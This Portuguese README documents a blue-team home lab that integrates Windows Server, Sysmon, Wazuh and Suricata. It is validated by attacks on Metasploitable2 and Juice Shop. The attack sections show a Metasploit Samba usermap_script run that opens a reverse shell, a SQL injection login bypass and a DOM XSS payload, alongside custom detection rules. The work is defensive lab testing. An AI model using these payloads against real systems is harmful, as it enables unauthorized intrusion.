
# Windows Server 2025 + Sysmon + Wazuh + Suricata — Lab de Detecção (Blue Team)

Laboratório de telemetria avançada em Windows Server, integração com SIEM (Wazuh) e NIDS (Suricata), validado com dois exercícios reais de Red Team vs Blue Team contra Metasploitable2 e OWASP Juice Shop.

## Sumário

- [Visão geral](#visão-geral)
- [Arquitetura do ambiente](#arquitetura-do-ambiente)
- [Parte 1 — Provisionamento do Windows Server](#parte-1--provisionamento-do-windows-server)
- [Parte 2 — Telemetria avançada (Sysmon + Auditoria)](#parte-2--telemetria-avançada-sysmon--auditoria)
- [Parte 3 — Integração com o Wazuh](#parte-3--integração-com-o-wazuh)
- [Parte 4 — Integração do Suricata](#parte-4--integração-do-suricata)
- [Parte 5 — Exercício 1: Metasploitable2](#parte-5--exercício-1-metasploitable2)
- [Parte 6 — Exercício 2: OWASP Juice Shop](#parte-6--exercício-2-owasp-juice-shop)
- [Lições aprendidas](#lições-aprendidas)
- [Stack utilizada](#stack-utilizada)

---

## Visão geral

Este laboratório expande o ambiente de SOC já existente (Wazuh, Kali, pfSense, Suricata, CrowdSec) adicionando um endpoint Windows Server com telemetria de host completa (Sysmon, auditoria avançada de processo, PowerShell logging). O objetivo foi sair de "telemetria passiva" para um ciclo completo de detecção: configurar o sensor, atacar de propósito, e validar — ou identificar a ausência de — detecção real no SIEM.

Dois exercícios práticos foram conduzidos:

1. **Metasploitable2** — exploração de uma falha clássica de rede (Samba `usermap_script`), validando a camada de NIDS.
2. **OWASP Juice Shop** — exploração de vulnerabilidades de aplicação web (SQL Injection, DOM XSS), expondo os limites do NIDS contra ataques modernos baseados em API/JSON e client-side.

Ao longo do processo, dois problemas reais de infraestrutura foram diagnosticados e corrigidos (interface de captura errada no Suricata, falha de aplicação de IP estático), e uma regra customizada de detecção foi criada para cobrir um gap real do ruleset ET Open.

## Arquitetura do ambiente

```
                    ┌──────────────────┐
                    │   pfSense (CE)    │
                    │  WAN: VMnet8/NAT  │
                    │  LAN: VMnet1      │
                    │  192.168.220.254  │
                    └─────────┬─────────┘
                              │
              ┌───────────────┼───────────────┬──────────────────┐
              │               │                │                  │
     ┌────────┴───────┐ ┌─────┴──────┐ ┌───────┴────────┐ ┌──────┴───────┐
     │  Kali Linux     │ │  Wazuh Mgr  │ │ Windows Server  │ │ Metasploit-  │
     │  192.168.220.130│ │  (Ubuntu)   │ │      2025        │ │  able2       │
     │  Suricata 8.0.5 │ │192.168.220. │ │192.168.220.50    │ │192.168.220.  │
     │  Juice Shop     │ │     103     │ │Sysmon + Wazuh    │ │     152      │
     │  (Docker :3000) │ │             │ │     Agent        │ │  (DHCP)      │
     └─────────────────┘ └─────────────┘ └──────────────────┘ └──────────────┘
```

| Host | IP | Função |
|---|---|---|
| pfSense | 192.168.220.254 | Gateway/firewall da LAN |
| Wazuh Manager (Ubuntu) | 192.168.220.103 | SIEM/XDR |
| Kali Linux | 192.168.220.130 | Atacante + Suricata + Juice Shop (Docker) |
| Windows Server 2025 (`win-srv01`) | 192.168.220.50 | Endpoint monitorado (Sysmon + Wazuh Agent) |
| Metasploitable2 | 192.168.220.152 (DHCP) | Alvo vulnerável (descartável) |

Todos os hosts estão na mesma VMnet1 (Host-only), com o pfSense atuando como gateway — todo tráfego de saída passa por ele, permitindo inspeção e logging centralizados.

---

## Parte 1 — Provisionamento do Windows Server

### 1.1 Download

Windows Server 2025 Standard (Desktop Experience), edição de avaliação gratuita de 180 dias, via [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2025).

### 1.2 Criação da VM (VMware Workstation)

| Parâmetro | Valor |
|---|---|
| vCPU | 2 |
| RAM | 4 GB |
| Disco | 60 GB (SCSI, thin provisioned) |
| Firmware | UEFI + Secure Boot |
| Rede | Custom: VMnet1 (mesma LAN do pfSense) |

> **Atenção:** o wizard de criação só oferece Bridged/NAT/Host-only/Do not use. A opção real (*Custom: Specific virtual network → VMnet1*) só aparece depois, em **Edit virtual machine settings → Network Adapter**.

### 1.3 Instalação

- Edição: **Windows Server 2025 Standard (Desktop Experience)** — não Datacenter (sem necessidade de Storage Spaces Direct/Shielded VMs para este lab).
- Product key: **"I don't have a product key"** (esperado em mídia de avaliação).
- Tipo de instalação: **Custom — instalação limpa**.

### 1.4 Rede

**Problema encontrado:** a configuração de IP estático feita via GUI (Painel de Controle) não persistiu — a interface continuou em DHCP, e o agente Wazuh chegou a aparecer registrado com IP dinâmico (`.151`) em vez do estático (`.50`) planejado.

**Diagnóstico:**
```powershell
Get-NetIPInterface -InterfaceAlias "Ethernet0" -AddressFamily IPv4 | Select-Object InterfaceAlias, Dhcp, ConnectionState
# Dhcp: Enabled  <- confirma que nunca foi de fato desabilitado
```

**Correção via PowerShell (reproduzível, preferível à GUI):**
```powershell
Remove-NetIPAddress -InterfaceAlias "Ethernet0" -Confirm:$false
Remove-NetRoute -InterfaceAlias "Ethernet0" -Confirm:$false -ErrorAction SilentlyContinue
Set-NetIPInterface -InterfaceAlias "Ethernet0" -Dhcp Disabled
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.220.50 -PrefixLength 24 -DefaultGateway 192.168.220.254
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.220.254
```

Validação:
```powershell
ping 192.168.220.254   # gateway
ping 8.8.8.8            # saída à internet via pfSense
```

### 1.5 Hardening básico

```powershell
Rename-Computer -NewName "win-srv01" -Restart
```

Remote Desktop habilitado para administração remota:
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Fuso horário ajustado para `(UTC-03:00) Brasília` — importante para consistência de timestamps na correlação de eventos do SIEM. Windows Update executado por completo antes de seguir.

---

## Parte 2 — Telemetria avançada (Sysmon + Auditoria)

### 2.1 Sysmon

Instalado com a configuração de referência da comunidade ([SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config)):

```powershell
.\Sysmon64.exe -i sysmonconfig-export.xml -accepteula
```

Validação:
```powershell
Get-Service sysmon64   # Status: Running
```
Eventos visíveis em **Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**.

### 2.2 Auditoria avançada do Windows

Três políticas habilitadas via `gpedit.msc` (Local Group Policy Editor):

| Política | Caminho | Efeito |
|---|---|---|
| Incluir linha de comando nos eventos de criação de processo | Modelos Administrativos → Sistema → Auditoria de Criação de Processo | Preenche `Process Command Line` no Event ID 4688 |
| Auditar Criação de Processo (Êxito) | Config. Avançada de Política de Auditoria → Monitoração Detalhada | Habilita o gerador do Event ID 4688 |
| Ativar Log de Bloco de Script do PowerShell | Modelos Administrativos → Windows PowerShell | Gera Event ID 4104 com conteúdo real de scripts executados |

Aplicado com `gpupdate /force` e validado conferindo os Event IDs **4688** (Security log) e **4104** (PowerShell Operational log) após executar comandos de teste.

---

## Parte 3 — Integração com o Wazuh

### 3.1 Instalação do agente

Deploy gerado pelo próprio dashboard (**Agents management → Deploy new agent → Windows**):

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.5-1.msi -OutFile $env:tmp\wazuh-agent.msi
msiexec.exe /i $env:tmp\wazuh-agent.msi /q WAZUH_MANAGER='192.168.220.103' WAZUH_AGENT_NAME='win-srv01'
NET START WazuhSvc
```

### 3.2 Monitorando Sysmon e PowerShell

Por padrão, o agente Windows do Wazuh só lê os canais `Application`, `Security` e `System`. Adicionado ao `C:\Program Files (x86)\ossec-agent\ossec.conf`:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>

<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

### 3.3 Tuning — falso positivo identificado

A regra nativa **92205** ("Powershell process created an executable file in Windows root folder", nível 9) disparou para uma execução legítima do módulo **SCA** do próprio Wazuh (`SecEdit.exe /export /cfg ... /secexport.cfg`, processo pai `ossec-agent`, integridade `System`, binário assinado pela Microsoft).

Regra de exceção criada no manager (`/var/ossec/etc/rules/local_rules.xml`):
```xml
<group name="local,sca,">
  <rule id="100205" level="3">
    <if_sid>92205</if_sid>
    <field name="win.eventdata.image">SecEdit.exe</field>
    <field name="win.eventdata.parentImage">ossec-agent</field>
    <description>Wazuh SCA module exporting security policy via SecEdit - expected behavior, not malicious</description>
    <options>no_full_log</options>
  </rule>
</group>
```

> IDs de regra customizada usam a faixa reservada **100000–119999**, nunca reaproveitando IDs do ruleset padrão (evita conflito em updates).

---

## Parte 4 — Integração do Suricata

O Suricata já estava instalado e ativo no Kali (documentado em [`suricata-lab`](../suricata-lab)). A integração com este novo manager Wazuh consistiu em adicionar ao `ossec.conf` do agente do Kali:

```xml
<localfile>
  <location>/var/log/suricata/eve.json</location>
  <log_format>json</log_format>
</localfile>
```

O Wazuh possui decoders nativos para o `eve.json`, sem necessidade de regra customizada para ingestão básica.

### Problema encontrado: sensor na interface errada

Após o primeiro teste de ataque (ver Parte 5), nenhum evento relacionado ao alvo aparecia no SIEM. Diagnóstico:

```bash
grep -A 5 "af-packet:" /etc/suricata/suricata.yaml
# interface: eth1   <- rede secundária do Kali (192.168.218.0/24)
```

O Suricata estava capturando tráfego na interface **errada** — `eth1`, não `eth0` (`192.168.220.0/24`, onde o ataque de fato ocorreu). Corrigido:

```yaml
af-packet:
  - interface: eth0
```

```bash
sudo systemctl restart suricata
```

> **Lição:** sensor de rede mal posicionado é uma das causas mais comuns de "gap de visibilidade" em SOCs reais — o sensor estava funcionando, só não via o tráfego certo.

---

## Parte 5 — Exercício 1: Metasploitable2

### 5.1 Reconhecimento

```bash
nmap -sV -p- 192.168.220.152
```
Confirmados serviços vulneráveis clássicos: `vsftpd 2.3.4` (porta 21), `Samba smbd 3.X` (139/445), `UnrealIRCd` (6667), `distccd` (3632).

**Detecção:** regra customizada pré-existente do Suricata disparou:
```
Suricata: Alert - POSSBL PORT SCAN (NMAP -sA)
```

### 5.2 Exploração

CVE-2007-2447 — Samba `usermap_script`:
```
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.220.152
msf exploit(multi/samba/usermap_script) > set LHOST 192.168.220.130
msf exploit(multi/samba/usermap_script) > run
[*] Command shell session 1 opened (192.168.220.130:4444 -> 192.168.220.152:43643)
```

Confirmação de acesso root:
```bash
whoami   # root
id       # uid=0(root) gid=0(root)
hostname # metasploitable
```

### 5.3 Detecção validada

Após a correção da interface (Parte 4), o reteste confirmou o alerta de exploração no `eve.json`:
```json
{
  "event_type": "alert",
  "src_ip": "192.168.220.152",
  "dest_ip": "192.168.220.130",
  "dest_port": 4444,
  "alert": {
    "signature": "POSSBL SCAN SHELL M-SPLOIT TCP",
    "category": "A Network Trojan was detected",
    "severity": 1
  }
}
```
Visível no dashboard do Wazuh, agente `kali-linux`, regra `86601` (decoder Suricata).

| Fase | Ação | Detecção |
|---|---|---|
| Reconhecimento | `nmap -sV -p-` | ✅ POSSBL PORT SCAN (NMAP -sA) |
| Exploração | `usermap_script` → shell reversa | ✅ POSSBL SCAN SHELL M-SPLOIT TCP |
| Pós-exploração | Acesso root confirmado | — (tráfego interno à shell, sem alerta de rede esperado) |

---

## Parte 6 — Exercício 2: OWASP Juice Shop

### 6.1 Setup

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
```

Acessado a partir de uma máquina diferente (`win-srv01`, via navegador) para garantir que o tráfego atravessasse a rede física e fosse visível ao Suricata — acesso via `localhost` no próprio Kali não geraria tráfego capturável.

### 6.2 SQL Injection (bypass de autenticação)

Campo de email no login:
```
' OR 1=1--
```
Resolveu o desafio **"Login Admin"** — acesso ao primeiro usuário do banco sem senha conhecida.

### 6.3 Gap de detecção identificado e regra customizada

Nenhum alerta nativo do ET Open disparou. Diagnóstico:
```bash
grep -c "classtype:web-application-attack" /var/lib/suricata/rules/suricata.rules
# 7104 — regras existem e estão carregadas
```

As 7104 regras existentes foram escritas majoritariamente para stacks legadas (WordPress, phpMyAdmin, parâmetros em **query string de GET**). O Juice Shop é uma API REST/JSON moderna — o payload de SQLi viaja no **corpo de uma requisição POST**, padrão não coberto pelas assinaturas genéricas.

Regra customizada criada em `/var/lib/suricata/rules/local.rules` (caminho determinado pelo `default-rule-path` do `suricata.yaml`):

```
alert http any any -> any 3000 (msg:"LOCAL SQLi Attempt - OR 1=1 in HTTP Body"; flow:to_server,established; http.request_body; content:"OR 1"; nocase; classtype:web-application-attack; sid:9000001; rev:1;)
```

Registrada em `suricata.yaml`:
```yaml
rule-files:
  - suricata.rules
  - local.rules
```

**Resultado, após restart e reteste:**
```json
{
  "alert": {
    "signature": "LOCAL SQLi Attempt - OR 1=1 in HTTP Body",
    "category": "Web Application Attack",
    "signature_id": 9000001
  },
  "http": { "url": "/rest/user/login", "http_method": "POST", "status": 200 }
}
```
Confirmado também no Wazuh (`rule.id: 86601`, descrição `Suricata: Alert - LOCAL SQLi Attempt - OR 1=1 in HTTP Body`).

### 6.4 DOM XSS — limite estrutural do NIDS

Payload usado (resolveu o desafio **"DOM XSS"**):
```
<img src=x onerror="alert('XSS')">
```

Uma primeira regra customizada (buscando a palavra `"script"` na URL) não disparou — esperado, já que o payload usa o atributo `onerror`, não a tag `<script>`. Regra ajustada:
```
alert http any any -> any 3000 (msg:"LOCAL XSS Attempt - script/onerror in URI"; flow:to_server,established; http.uri; pcre:"/(script|onerror|onload)/i"; classtype:web-application-attack; sid:9000002; rev:2;)
```

Mesmo após o ajuste, **nenhum evento disparou**. Investigação no `eve.json` revelou a causa raiz real:

```bash
sudo grep -a "products/search" /var/log/suricata/eve.json
# todas as ocorrências: "url":"/rest/products/search?q="  <- sempre vazio
```

O Juice Shop é uma SPA Angular com roteamento baseado em **hash** (`#/search?q=...`). O parâmetro de busca nunca é enviado ao servidor como parte de uma requisição HTTP — é lido e renderizado inteiramente no DOM pelo JavaScript do navegador. **Não existe pacote de rede correspondente a esse ataque.**

| Tipo de ataque | Trafega pela rede? | NIDS pode detectar? |
|---|---|---|
| SQL Injection (body POST) | Sim | Sim (com regra adequada) |
| XSS Refletido/Armazenado | Geralmente sim | Depende da assinatura |
| **DOM XSS puro** | **Não** | **Nunca, por design** |

Detecção adequada para esse vetor exigiria controles client-side (CSP, extensões de navegador) ou WAF/RASP com inspeção de execução JS — fora do escopo de um NIDS de rede como o Suricata.

---

## Lições aprendidas

1. **IP estático via GUI pode não persistir** — preferir PowerShell (`New-NetIPAddress`, `Set-NetIPInterface`) por ser reproduzível e fácil de auditar.
2. **Sensor de rede mal posicionado é invisível até ser testado** — a interface errada no `af-packet` só foi percebida porque um ataque real foi conduzido; configuração nunca validada com tráfego real é configuração não confirmada.
3. **Cobertura de IDS/IPS de assinatura é desigual entre gerações de ataque** — ruleset ET Open cobre bem exploits de protocolo clássicos (SMB, FTP, IRC), mas tem lacunas reais contra APIs JSON modernas (corpo de POST) — exigiu escrita de regra customizada.
4. **Nem todo ataque é visível à rede** — DOM XSS é um lembrete de que NIDS é uma camada, não a solução completa; defesa em profundidade (host + rede + aplicação) continua necessária.
5. **Falsos positivos acontecem mesmo com ferramentas legítimas** — o próprio módulo SCA do Wazuh gerou um alerta de nível alto; tuning de regras é trabalho contínuo, não configuração única.

## Stack utilizada

- Windows Server 2025 Standard (Desktop Experience) — avaliação 180 dias
- Sysmon (config [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config))
- Wazuh 4.14.5 (Manager + Agents)
- Suricata 8.0.5 (ruleset ET Open)
- Kali Linux 2026.1
- Metasploit Framework 6.4.135-dev
- Metasploitable2
- OWASP Juice Shop (Docker, `bkimminich/juice-shop`)
- pfSense CE
- VMware Workstation


---

## 🔗 Laboratórios do SOC Home Lab

| Lab | Repositório | Descrição |
|-----|-------------|-----------|
| 🛡️ Wazuh SIEM/XDR | [wazuh-lab](https://github.com/gabrielzaccaferreira/wazuh-lab) | Instalação, configuração e regras customizadas do Wazuh |
| 🐉 Kali Linux | [kali-remote-access-lab](https://github.com/gabrielzaccaferreira/kali-remote-access-lab) | Setup do ambiente de ataque e acesso remoto |
| 🔍 Suricata IDS/IPS | [suricata-lab](https://github.com/gabrielzaccaferreira/suricata-lab) | Detecção de intrusão em rede, regras customizadas |
| 🛡️ CrowdSec | [soc-lab-crowdsec-kali](https://github.com/gabrielzaccaferreira/soc-lab-crowdsec-kali) | IPS colaborativo com blocklists dinâmicas |
| 🔬 Wireshark | [wireshark-analysis-lab](https://github.com/gabrielzaccaferreira/wireshark-analysis-lab) | Análise de tráfego e dissecção de protocolos |
| 🔥 pfSense | [pfsense-lab](https://github.com/gabrielzaccaferreira/pfsense-lab) | Firewall, NAT, VLANs e regras de perímetro |
| 🪟 Windows Server + Sysmon | [windows-server-soc-lab](https://github.com/gabrielzaccaferreira/windows-server-soc-lab) | Telemetria Windows, Sysmon, Red Team vs Blue Team |

> 🌐 Portfólio completo: [gabrielzacca.com.br](https://gabrielzacca.com.br)

